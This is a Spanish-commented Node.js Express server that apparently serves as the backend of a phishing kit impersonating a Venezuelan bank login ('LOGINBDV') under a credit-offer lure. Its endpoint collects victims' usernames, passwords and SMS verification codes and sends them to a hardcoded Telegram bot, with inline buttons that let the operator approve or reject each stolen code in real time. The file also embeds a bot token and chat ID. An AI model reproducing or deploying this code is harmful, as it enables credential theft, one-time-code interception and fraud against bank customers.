const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware para leer datos JSON enviados desde el frontend
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Servir archivos estáticos (HTML, CSS, imágenes)
app.use(express.static(path.join(__dirname)));

// Credenciales fijas de tu bot (extraídas de tu script original)
const BOT_TOKEN = '8878279475:AAEdCmf7PRO_6iLJLFKgAbjAwj9nfJ-Crb0';
const CHAT_ID = '7924619096';

// Endpoint para recibir las credenciales o códigos desde tu frontend y enviarlos a Telegram con botones
app.api = app.post('/api/enviar-telegram', async (req, res) => {
    const { tipo, usuario, password, smsCode, amount } = req.body;

    let mensaje = '';
    
    if (tipo === 'login') {
        mensaje = `💻ㅤ<b>[ LOGINBDV - CRÉDITO ${amount} ]</b>\n\n` +
                  `👥ㅤ<b>Usuario:</b> ${usuario}\n` +
                  `🔐ㅤ<b>Contraseña:</b> ${password}\n\n` +
                  `🕒ㅤ${new Date().toLocaleString()}`;
    } else if (tipo === 'sms') {
        mensaje = `💻ㅤ<b>[ LOGINBDV - CRÉDITO ${amount} ]</b>\n\n` +
                  `👥ㅤ<b>Usuario:</b> ${usuario}\n` +
                  `🔢ㅤ<b>Código SMS:</b> ${smsCode}\n\n` +
                  `🕒ㅤ${new Date().toLocaleString()}`;
    }

    // Definir los botones inline para aprobar o rechazar
    const replyMarkup = {
        inline_keyboard: [
            [
                { text: "✅ Aprobar / Éxito", callback_data: "accion_aprobar" },
                { text: "❌ Rechazar / Reintentar", callback_data: "accion_rechazar" }
            ]
        ]
    };

    try {
        const fetch = (await import('node-fetch')).default; // O usa fetch nativo si estás en Node 18+
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: mensaje,
                parse_mode: 'HTML',
                reply_markup: replyMarkup
            })
        });

        const data = await response.json();
        res.json({ success: true, data });
    } catch (error) {
        console.error('Error al enviar a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Rutas para las páginas HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/exito.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'exito.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});